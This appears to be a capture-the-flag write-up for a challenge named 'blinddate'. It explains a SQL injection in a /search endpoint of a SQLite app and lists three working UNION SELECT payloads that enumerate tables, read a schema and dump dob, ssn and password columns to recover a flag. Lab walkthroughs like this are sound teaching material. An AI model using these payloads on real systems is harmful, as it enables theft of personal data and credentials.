# blinddate

## Summary
The `/search` endpoint is vulnerable to SQL injection because it concatenates untrusted input directly into a SQLite query:

`SELECT * FROM users WHERE username = '<user input>'`

Since the app prints query results, we can use a `UNION SELECT` to extract data from `sqlite_master` and then dump the `secret_info` table.

## Walkthrough

### 1) Enumerate tables

Submit the following as the `username` form parameter:

`' UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table' -- `

This returns table names in the rendered output.

### 2) Inspect the secret table schema

`' UNION SELECT sql, NULL, NULL FROM sqlite_master WHERE name='secret_info' -- `

### 3) Dump secrets / retrieve the flag

`' UNION SELECT dob, ssn, password FROM secret_info -- `

The flag is present in the dumped data (in this instance, stored in the `password` column for the `charlie` row).

